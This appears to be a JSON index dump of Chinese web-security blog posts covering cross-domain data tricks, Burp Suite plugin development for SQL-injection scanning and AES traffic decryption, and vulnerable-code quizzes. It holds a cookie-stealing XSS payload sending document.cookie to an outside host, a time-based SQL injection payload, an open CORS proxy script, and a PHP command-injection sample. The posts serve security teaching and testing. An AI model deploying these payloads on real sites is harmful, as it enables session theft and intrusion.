i=document.createElement(&quot;img&quot;);i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);xxx.appendChild(i);","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"跨域获取数据小结","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/web安全/跨域获取数据小结/","text":"本文主要介绍几种跨域获取数据的方法，比较基础，但是在跨站漏洞的挖掘和利用上会起到很大的帮助。 下面根据个例子简单的把遇到的跨域总结下 场景：网站A获取网站B上的资源，需要跨域传输数据 两种情况： 1、B站资源可控，即可以更改B站资源内容 2、B站资源不可控 测试环境： 我们这里设置简单点，为了下面的说明，统一设置到test.com域下，只是二级域名不相同。只要不设置document.domain,这样也不算是同域 hosts设置： ip a.test.com ip b.test.com 测试需求： 利用a站获取到b站的资源 首先采用直接使用iframe加载，直接使用js来获取数据 B站点要获取的data文件内容： 12&lt;p id=\"data\"&gt; Hello A Site, I am from B site!! &lt;/p&gt; A站点获取数据html代码： 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;title&gt;A want to get B data&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement('iframe');iframe.src = 'http://b.test.com/data.html';iframe.style.display = 'none';iframe.onload = function() &#123; var doc = iframe.contentDocument || iframe.contentWindow.document; console.log(doc.getElementById('data').textContent);&#125;document.body.appendChild(iframe);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在chrome下访问A站的getB.html，出现 Uncaught SecurityError: Failed to read the ‘contentDocument’ property from ‘HTMLIFrameElement’: Blocked a frame with origin “http://a.test.com“ from accessing a frame with origin “http://b.test.com“. Protocols, domains, and ports must match. 同源策略直接进行了阻止,防止进行跨域操作。 很多时候会采用ajax去获取访问数据，下面是获取数据代码： 12345678910111213141516171819202122232425&lt;html&gt;&lt;script&gt;var xmlhttp;if (window.XMLHttpRequest) &#123;// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); &#125;else &#123;// code for IE6, IE5 xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125;xmlhttp.open(\"GET\",\"http://b.test.com/data.html\",true);xmlhttp.send();xmlhttp.onreadystatechange=function() &#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; console.log(xmlhttp.responseText); &#125; &#125;&lt;/script&gt;&lt;/html&gt; 访问，看chrome下面的提示： XMLHttpRequest cannot load http://b.test.com/data.html. No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘http://a.test.com‘ is therefore not allowed access. 下面分两种情况实现跨域获取数据： B站的资源是可控的 通过document.domain来控制 同主域名下iframe控制document.domain进行读取，修改data.html和getB.html内容增加域的设置： document.domain=”test.com” 再次访问，成功获取到数据信息，这个是最简单的，大域是相同的，都是可以去利用的。其实所有的com网站，cn网站都是一个大域，不过现在浏览器拒绝了这样的请求 iframe结合location.hash进行跨域数据获取 B站下data文件： 123456789101112&lt;script&gt;data = 'ImBsitedata';var ifr = document.createElement('iframe');ifr.src = 'http://a.test.com/hash/proxy.html#'+data;document.body.appendChild(ifr);&lt;/script&gt; A站下的proxy文件： 123&lt;script&gt;parent.parent.location.hash = self.location.hash.substring(1);&lt;/script&gt; 主要是B站的data文件iframe加载proxy，hash获取到data数据，传递给proxy.html的hash中，proxy获取到hash传递给同源的A站 getB_byhash.html 123456789101112131415161718192021&lt;html&gt;&lt;head&gt; &lt;title&gt;Site A&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement('iframe');iframe.src = 'http://b.test.com/hash/data.html';document.body.appendChild(iframe);var checkOut = function() &#123;try &#123;var data = location.hash ? location.hash.substring(1) : '';if (console.log) &#123;console.log('new data is: ' + data);&#125; &#125; catch(e) &#123;&#125;&#125;setInterval(checkOut, 2000);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 主要是利用A站获取数据文件iframe加载B站的data文件，data文件又加载A站的proxy文件，proxy的hash中存有B站的数据，proxy和get文件同源，利用parent.parent两个父页面传递出hash 通过iframe.name跨域传递数据 B站的data文件为： 123&lt;script&gt;window.name = \"I am from B site!!!\";&lt;/script&gt; A站getB_byname.html的内容： 1234567891011121314151617181920212223&lt;html&gt;&lt;head&gt; &lt;title&gt;Site A&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var state = 0;var iframe = document.createElement('iframe');iframe.src = 'http://b.test.com/name/data.html';var loadfn = function() &#123;if (state === 1) &#123;var data = iframe.contentWindow.name;console.log(data);&#125; else if (state === 0) &#123;state = 1;iframe.contentWindow.location = 'http://a.test.com';&#125;&#125;iframe.onload = loadfn;document.body.appendChild(iframe);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码可以变得更简单点： 1234567891011121314151617&lt;body&gt;&lt;script&gt;stats=0var iframe=document.createElement(\"iframe\");iframe.onload=function () &#123;if(stats===0)&#123;stats=1;iframe.src=\"http://a.test.com/\";&#125;else&#123;console.log(iframe.contentWindow.name);&#125;&#125;;iframe.src=\"http://b.test.com/name/data.html\";document.body.appendChild(iframe);&lt;/script&gt;&lt;/body&gt; 原理： 主要就是先iframe 加载数据页面，此时window.name传递给了iframe的name，在利用跳转到同源的页面下，输出数据。 json劫持 B站的data数据： 1var data=\"I am from B site!!!\" A站的get代码： 1234&lt;script src=\"http://b.test.com/json/data.html\"&gt;&lt;/script&gt;&lt;script&gt;console.log(data);&lt;/script&gt; html5中的postMessage B站的data数据： 123window.onload=function()&#123; parent.postMessage(&apos;I am B data!!&apos;,&apos;*&apos;);&#125; 获取数据代码： 123456&lt;iframe src=&quot;http://b.test.com/H5/data.html&quot;&gt;&lt;/iframe&gt;&lt;script&gt;window.addEventListener(&apos;message&apos;,function(e)&#123; alert(e.data);&#125;)&lt;/script&gt; 这个可以参考下呆子不开口的《对方不想说话并扔了个message》 CORS 主要就是通过设置相应头中的 Access-Control-Allow-Origin 字段。前面直接用ajax获取数据时候已经提示了。 Access-Control-Allow-Origin 响应字段说明了该资源或网站所允许被非同源站点访问的站点列表，当 Access-Control-Allow-Origin 中包含网站 A 或者设置为 * 时，网站 A 即可对网站 B 上的资源进行任意访问。 也就是利用ajax请求可以获取到数据信息的。 php文件： 1234567&lt;?phpheader(&quot;Access-Control-Allow-Origin: *&quot;);echo &quot;Site B PHP resource!!&quot;;?&gt; 设置 Access-Control-Allow-Origin 允许所有站点访问读取 get代码： 12345678910111213141516171819&lt;script&gt;var xml = new XMLHttpRequest();xml.open(&apos;get&apos;, &apos;http://b.test.com/data.php&apos;, true);xml.onreadystatechange = function() &#123;if (xml.readyState == 4 &amp;&amp; xml.status==200) &#123;console.log(xml.responseText);&#125;&#125;xml.send();&lt;/script&gt; B站资源不可控 利用中间代理访问,方法利用php页面去访问数据页面获取到数据，在利用cors传递回来。 代理代码： 123456789101112131415&lt;?phpheader('Access-Control-Allow-Origin: *');$method = $_REQUEST['method'];$target = $_REQUEST['target'];$data = $_REQUEST['data'];$curl = curl_init();curl_setopt($curl, CURLOPT_URL, $target);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0);if ($method == 'post') &#123;curl_setopt($curl, CURLOPT_POST, 1);curl_setopt($curl, CURLOPT_POSTFIELDS, $data);&#125;curl_exec($curl);curl_close($curl);?&gt; A站直接ajax请求proxy即可 12345678910111213141516171819&lt;script&gt;varxhr=newXMLHttpRequest();varproxyUrl='http://issec.xxxx.com/proxy/proxy.php';xhr.open('post',proxyUrl,true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('method=get&amp;target=http://b.test.com/proxy/data.html&amp;data=');xhr.onreadystatechange=function()&#123; if(xhr.readyState==4&amp;xhr.status==200) &#123;console.log(xhr.responseText)&#125;&#125;&lt;/script&gt; 讨论： 你还有那些跨域获取数据的方法？ 问题： 这里面代码里面存在哪几个漏洞设置？ 讨论下same攻击 首先php代码是有缺陷的，不去设置过多，最简单的，页面内容不可控： 地址为：www.same.com/1.php 123456&lt;?php$callback = $_GET['callback'];$callback=preg_replace(\"/[')(&lt;&gt;&#123;&#125;]|\\]|\\[|\\/|\\\\\\|\\\"|\\|/\",\"\",$callback);echo \"&lt;script&gt;\".$callback.\"()&lt;/script&gt;\";?&gt; 这里有个html页面，里面就是个点击的按钮，页面内容不可控： 地址为www.same.com/1.html 1&lt;button id=\"pid\" onclick=alert('click')&gt;&lt;/button&gt; 怎么实现自己写个站点页面（不能和same同域），让其他人访问这个页面后出现点击事件？分别考虑下1.php限制了referer和不限制referer的情况。","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"基于burp插件的安全测试","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/","text":"基于burp插件的安全测试前言burp是很多web安全爱好者都会用到的神器，burp专业版集成了代理、fuzzing、重放、扫描等功能，对于自动化扫描功能来说，里面的poc都是官方集成好的，很难增加自己的特殊poc代码，最新版开放了burp的开发api，利用api可以很简单的集成自己的扫描poc，针对特定的站点进行针对性的扫描 相对于其他扫描器，基于burp的自动化扫描可以不用考虑登入、cookie的处理问题，以及不用考虑爬虫爬不到的链接，只要你点击站点所有的页面后，burp的代理功能都会记录下请求来，设置不用考虑poc的插入位置问题，burp默认会对所有的位置进行poc的插入测试，连url里面的path路径都会涉及到。 基本知识burp在extender标签中，可以增加自己的插件代码，支持python、ruby、java，在测试中发现，java的效率是最高的，并且开发起来，在ide中导入jar包很容易开发，比起python、ruby还需要第三方插件的支持，并且效率比起java还是比较慢 在BAPP Store中有很多开发好的插件代码，可以下载下来，安装后，在指定的目录下面会有相应的python代码或者jar包存在，这些都是很好的学习代码，推荐几个比较好用的插件： JSON Decoder，可以将json数据格式化，比较方便查看。 Active Scan++ 增加了一些本身自动化扫描没有的漏洞检查。 在APIs中是burp提供的api接口，自己没有接触过java代码，看起来比较费劲，可以先不用管他，可以在编写插件的时候了解到怎么使用和功能等等。 下面的save，可以将这些api文件保存起来，后面编写java代码直接调用相应的接口 Options里面是一些设置，主要是设置一些运行环境，比如你想用python写插件的话，就需要安装jython第三方包了 sql注入插件开发开发插件使用的是IDEA，创建一个新工程，创建一个新的package，注意这里命名为burp，将我们下载好的api包导入这个package中，后面需要创建插件的主要代码程序，这里还需要注意，这个代码文件的命名需要是BurpExtender，这个是必须的。 这里我们做一个基于时间延时的sql注入扫描，sqlmap里面也有，但是sqlmap跑起来太慢，burp的自动化扫描，针对时间的sql注入扫描并不是很好用，poc比较少。 由于我们这个插件主要做的就是把参数后面增加poc或者替换参数值为poc再去访问，判断执行时间是否有延时 看了Active Scan++的源码，在IScannerCheck接口中有自动化的扫描函数：doActiveScan，并且会自动化的把poc插入到每一个测试点中，我们做的就是把poc给他，然后访问，看访问执行到访问结束的时间 给出简单代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class BurpExtender implements IBurpExtender, IScannerCheck&#123; //实现IScannerCheck的doActiveScan // 实现IBurpExtender的registerExtenderCallbacks，来注册插件 @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)&#123; //注册插件，使burp可以加载到我们的插件 payloads[xxx]=\"*if(now()=sysdate() and 1=1,SLEEP(10),0)\"; //自己的payload列表，将自己的注入poc写在这里 this.mcallbacks = callbacks; stdout = new PrintWriter(callbacks.getStdout(), true); helpers = callbacks.getHelpers(); //helpers非常有用，可以帮你处理很多东西，这个后续需要好好研究下 callbacks.setExtensionName(\"FuckScan\"); callbacks.registerScannerCheck(this); &#125; // 上述代码就可以将自己的插件增加到burp里面了 @Override public List&lt;IScanIssue&gt; doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) &#123; // 这里重写doActiveScan，在自动话扫描的时候增加我们的扫描代码 // baseRequestResponse 是IHttpRequestResponse类型，这个里面包含了当前请求的所有信息，包括request和response信息 // insertionPoint 是插入点，里面可以自动设置只在哪个位置进行插入测试，测试过程中发现代码有问题，只好全部扫描了 String value = insertionPoint.getBaseValue(); //这个是先取下插入点的参数值，有的poc需要的是增加在原有的参数值后面生效的 SqlScanner(baseRequestResponse,insertionPoint,value);//将当前的页面信息，插入点，和原有参数值传递到sql注入扫描中 &#125; public void SqlScanner(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint,String value)&#123; if(payload.contains(\"*\"))&#123;//在poc中进行设置，主要出现×的就直接用poc测试，没有出现的用原有值增加poc测试 payload_byte = payload.getBytes();//这里注意所有的操作，都是基于byte类型基础上的，需要进行转化处理 &#125; else &#123; payload_byte = (value + payload).getBytes(); &#125; byte[] checkRequest = insertionPoint.buildRequest(payload_byte);//这里是创建新的request，主要是将poc加入的重新生成一个request long start = System.currentTimeMillis();//记录当前时间 IHttpRequestResponse checkqeuestResponse = this.mcallbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest); // 这个是带poc去请求，我不管正常的请求时间，只需要知道这个request运行了多少时间 // getHttpService，返回的是包含现在所有http服务请求的object // makeHttpRequest 是使用checkRequest并重新请求获取服务器的响应 //为了减少误报，这里采用了两次请求的方法，结果比一次好些 // TODO:需要判断下原请求的时间，过程中还是发现不少误报 long end = System.currentTimeMillis();//记录请求结束时间 if (runtime &gt; 9000)&#123;//poc中做的都是延时10秒，若有sql注入时间会出现比较大的延时 stdout.println(\"[SQL注入成功:]\"); stdout.println(helpers.bytesToString(checkRequest));//在log中打印此次请求的request //TODO:后续利用IScanIssue增加到burp的扫描结果中 &#125; &#125;&#125; 这就是基于time延时的扫描插件，很简单的几行代码就能结合burp本身的优势将我们的poc增加到自动化扫描里面 我自己结合cloudeye增加了命令执行的检查，简单的用curl，将当前有命令执行的请求传递到cloudeye的日志里面，测试过程中发现见有几个产生了dns请求，没有执行curl，没有访问日志 AES加解密插件开发在测试的过程中还需要一个问题，很多android在数据传输的时候对数据进行了加密处理，在测试的时候没有办法增加自己的poc来对进行测试，但是反编译app能发现AES的私钥硬编码在app中这样可以在流量通过burp的时候对流量进行解密再增加poc再加密发送出去进行测试 这个大牛们写过这方面的文章，自己也是在参考他们的基础上完成的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class BurpExtender implements IBurpExtender, IHttpListener, IMessageEditorTabFactory &#123; //初始化使用的对象 private IBurpExtenderCallbacks callbacks; private IExtensionHelpers helpers; private PrintWriter stdout; private String skey = \"FL5LCBJL3JN534JC\"; //AES私钥 private String IV = \"E68CFL7BK8KCCG6N\";//AES IV //注册插件 @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123; stdout = new PrintWriter(callbacks.getStdout(), true); this.callbacks = callbacks; helpers = callbacks.getHelpers(); callbacks.setExtensionName(\"AES encrypt java edition\"); callbacks.registerHttpListener(this);//为下面的processHttpMessage 注册,否则下面的方法不能使用 &#125; @Override public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) &#123; //这个是对IHttpListener的方法改写，The listener will be notified of requests and responses made by any Burp tool. // toolFlag 是来定义那些请求是需要进行处理的。不同的参数值代表burp的不同位置 // messageIsRequest 消息是否是请求包 // messageInfo 包内容 if (toolFlag == 64 || toolFlag == 16 || toolFlag == 32 || toolFlag == 4) &#123; //不同的toolflag代表不同的burp组件,16:scanner;64:repeater;32:interuder;4:proxy //详情查看:https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks if (messageIsRequest) &#123;//请求包 IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);//利用helper自动处理请求包 List&lt;String&gt; headers = analyzeRequest.getHeaders();//获取请求头列表 List&lt;IParameter&gt; paraList = analyzeRequest.getParameters();//获取参数列表,参数分为三类:URL\\COOKIE\\BODY byte[] new_Request = messageInfo.getRequest(); for (IParameter para : paraList) &#123;//循环获取参数,判断类型,进行加密处理后,再构造新的参数,合并到请求包中 if ((para.getType() == 0 || para.getType() == 1) &amp;&amp; !paraWhiteList.contains(para.getName())) &#123;//通过type来判断参数位于那个位置, // cookie是不需要处理的 String key = para.getName(); String value = para.getValue(); aesvalue = aes.encrypt(skey, IV, value); aesvalue = helpers.urlEncode(aesvalue);// aesvalue = URLEncoder.encode(aesvalue, \"UTF-8\");//进行url编码// stdout.println(\"[ENCODE:]\" + key + \":\" + value + \":\" + aesvalue); //输出到extender的UI窗口 IParameter newPara = helpers.buildParameter(key, aesvalue, para.getType());//构造新的请求参数 new_Request = helpers.updateParameter(new_Request, newPara);//构造新的请求包 messageInfo.setRequest(new_Request);//设置最新的请求包 &#125; &#125; &#125; else &#123;//处理返回的响应包，就是把返回的响应进行解密后展示出来，设计到几个api中的函数，看名称应该知道什么意思了 IResponseInfo anaylyzeResponse = helpers.analyzeResponse(messageInfo.getResponse()); List&lt;String&gt; header = anaylyzeResponse.getHeaders(); short statusCode = anaylyzeResponse.getStatusCode(); int badyOffset = anaylyzeResponse.getBodyOffset(); AESOperator aes = new AESOperator(); String resp = new String(messageInfo.getResponse()); String body = resp.substring(badyOffset); String debody = aes.decrypt(skey, IV, body); debody = debody.replace(\"\\\"\", \"\\\\\\\"\"); String UnicodeBody = (new CharSetUtil()).decodeUnicode(debody); String newBody = UnicodeBody; byte[] bodybyte = newBody.getBytes(); messageInfo.setResponse(helpers.buildHttpMessage(header, bodybyte)); 这个AES的加解密插件只要针对不同的加密密钥更改就行，可以很方面的解密出app中传递的参数，有的app还有增加sign校验值，只要反编译app获取算法后一样可以增加到插件中，这样就能对加密和增加校验值的进行web测试了 插件扫描结果在测试新浪的服务的时候，直接打开自动扫描，可以把burp内置的扫描关闭掉，这样速度还是可以的，只要浏览sina的页面，插件自动进行扫描，结果发现sina的两处sql注入问题，这个要感谢川神的支持 当然测试中针对不同的网站特定进行手工的测试，总结出通用的poc之后加入到插件中去，直接在访问页面的时候就可以发现漏洞了 AES加解密的插件，利用起来可以查看一个乌云的一个案例Zealer_android客户端安全检测 TODO 学习java代码，优化插件 增加更多的扫描插件，需要更对测试，获取每个网站业务特定漏洞poc，后续可以集成到自己的一个插件框架下面，在burp下面增加可以增加poc的输入框。 总结自己在java方面算是入门级别，这些也都是是参考各位大牛的基础上写的，过程中感觉很大一部分简单的知道java调用就行，主要是api的使用，当然会java的应该会编写出更加牛叉的测试插件，burp是个神器，在神器作为平台开发插件可以介绍很多工作量和避免很多坑。 有很多的神器都是提供插件的集成的，网页浏览chrome本身就是一个框架，可以自己写chrome插件，端口扫描神器nmap也可以自定义插件扫描，移动安全方面，android hook方面有xposed框架，应用安全检测方面有drozer框架，自己开发插件集成可以玩出很多花样。 问题以下代码可能存在什么问题？ 123456789101112131415161718&lt;?php extract($_POST); // 輸入淨化 if (!mb_detect_encoding($p1, 'UTF-8', true) &amp;&amp; !mb_detect_encoding($p1, 'big5', true)) &#123; die(\"funny how a melody sounds like a memory\"); &#125; $p1 = mb_ereg_replace(\"\\\\\\\\\", \"\\\\\\\\\", $p1); $p1 = mb_ereg_replace(\"\\\"\",\"\\\\\\\"\", $p1); $p1 = mb_ereg_replace(\"\\\\$\", \"\\\\$\", $p1); $p1 = mb_ereg_replace(\"`\", \"\\\\`\", $p1); // 記錄日誌 exec_sql(\"INSERT INTO iface_log (content, data) VALUES(?, ?)\", \"ss\", \"Remote interface called\", json_encode(array('p1'=&gt;$p1, 'p2'=&gt;$p2))); // 執行轉換 system(\"timeout 2 /scripts/convert.sh reverse \\\"$p1\\\"\");","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]}]